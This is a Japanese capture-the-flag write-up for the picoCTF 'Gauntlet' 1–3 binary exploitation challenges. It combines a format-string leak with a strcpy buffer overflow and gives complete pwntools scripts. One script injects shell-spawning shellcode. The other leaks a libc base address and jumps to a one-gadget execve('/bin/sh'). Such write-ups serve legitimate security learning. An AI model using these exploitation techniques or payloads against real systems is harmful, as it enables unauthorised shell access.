## tl;dr

FSB, BOF, ret2libc

## プログラム

1-3 で共通する点と、異なる点を挙げます。

### 共通する点

まず、プログラムは以下のような内容です。ユーザ関数は `main` のみです。

- 64 bit ELF x86_64
- Heap 上で入力を受け取る
- 入力された内容を出力する ← **Format String Bug!!**
- もう一度同じ配列で入力を受け取る
- 入力した配列を、Stack 上の配列に `strcpy` でコピー ← **Buffer Over Flow!!**

今回は、入力からリターンアドレスまでの offset は 120 文字です。
なお、コピーに `strcpy` を使う訳なので、payload に NULL バイトを入れるとそれ以降が無効になる事に注意です。

次に、セキュリティ機構について。

- Partial RELRO
- Stack Smash Protection が無効
- PIE が無効

pwn の問題において、ASLR は全て有効なものと考えたおいた方が良いです。

### 異なる点

- 1 はスタック上のコピー先のアドレスを吐いてくれる
- 2 までは NX bit が無効だが、3 は有効 (i.e. shellcode はダメになる)

## 解法

### Gauntlet 1 (30pts)

NX bit が無効な上、入力した配列のアドレスも吐いてくれるので、shellcode を入力した上で BOF でリターンアドレスを入力先に書き換えるとシェルが起動します。

簡単ですね！

```python
from pwn import *
elf=context.binary=ELF("./vuln")
#p=process("./vuln")
p=remote("mercury.picoctf.net",65502)
addr=int(p.recvline(),16)

payload=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
payload+=b"A"*(120-len(payload))
payload+=p64(addr)

p.sendline(payload)
p.sendline(payload)
p.interactive()
```

### Gauntlet 2 (50pts)

多分 FSB でアドレスを特定して shellcode に飛ばせばいいんですが、リモートだと上手く行きませんでした。

vuln が main 以外の関数だったら良かったんですが、恐らく libc の関係です。うーん

という事で、上位互換の Gauntlet 3 を解いてよしとしましょう。3 は NX bit が有効なので、そちらを解ければ 2 も解けます。

### Gauntlet 3 (80pts)

まず、1 回目の入力で FSB を利用して libc base を特定しましょう。
main 関数のリターンアドレスは `__libc_start_main` 内部ですから、その値が分かれば libc のバージョンも分かります。今回は `%23$p` で特定できます。

```
$ nc mercury.picoctf.net 15887
%23$p
0x7f5de9a61bf7
```

あとは、[libc database](https://libc.blukat.me/) に投げると当該 libc をダウンロードできます。libc が分かると、実際のアドレスから libc 内の offset を引く事により libc base が特定できます。

さて、あとは BOF でリターンアドレスを書き換える訳ですが、NULL を途中に入れるとダメなのでアドレスは 1 つまでしか入れられません。普通に ROP をしようとすると、`pop rdi` などを挟まないといけないため、途中で終わってしまいます。どうしよう？

→ **one-gadget RCE**

one-gadget RCE とは、libc 内に含まれる `execve("/bin/sh",NULL,NULL)` を使ってシェルを起動する事です。

[ツール](https://github.com/david942j/one_gadget) を使うと簡単に調べられます。ただ、レジスタやスタックの状態によって上手く行く場合と行かない場合があります。

```
$ one_gadget libc6_2.27-3ubuntu1.4_amd64.so 
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

今回は、2 番目の gadget で上手く行きました。

以上より、無事にシェルを起動できました。

```python
from pwn import *
elf=context.binary=ELF("./vuln")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
p=process("./vuln")
p=remote("mercury.picoctf.net",15887)

payload=b"%23$p"
p.sendline(payload)
#addr=int(p.recvline(),16)-0x270b3
addr=int(p.recvline(),16)-0x21bf7
print(hex(addr))
payload=b"A"*120
payload+=p64(addr+0x4f432)
p.sendline(payload)
p.interactive()
```

と、これで 3 が解けたので 2 も解けました。これで 80pts って厳しくない？